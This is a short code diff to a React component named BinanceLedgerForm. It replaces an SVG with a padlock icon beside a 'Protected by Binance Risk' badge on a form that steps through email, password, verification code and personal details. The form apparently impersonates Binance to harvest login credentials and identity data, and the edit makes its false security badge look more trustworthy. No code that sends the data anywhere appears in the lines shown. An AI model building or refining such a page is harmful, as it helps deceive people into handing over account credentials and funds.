@@ -1,5 +1,6 @@
 import { FC, useState } from "react";
 import { useToast } from "@/hooks/use-toast";
+import { Lock } from "lucide-react";
 
 type FormStep = 'email' | 'password' | 'verification' | 'personal-details' | 'success';
 
@@ -621,17 +622,7 @@ const BinanceLedgerForm: FC = () => {
             lineHeight: "16px"
           }}
         >
-          <svg 
-            width="16" 
-            height="16" 
-            viewBox="0 0 16 16" 
-            className="mr-2"
-            style={{ color: "var(--color-TertiaryText, #848E9C)" }}
-            fill="currentColor"
-          >
-            <path d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1ZM8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0Z"/>
-            <path d="M7.5 3a.5.5 0 0 1 1 0v5.793L10.146 7.146a.5.5 0 0 1 .708.708l-2.5 2.5a.5.5 0 0 1-.708 0l-2.5-2.5a.5.5 0 1 1 .708-.708L7.5 8.793V3Z"/>
-          </svg>
+          <Lock size={16} className="mr-2" style={{ color: "var(--color-TertiaryText, #848E9C)" }} />
           Protected by Binance Risk
         </div>
       </form>
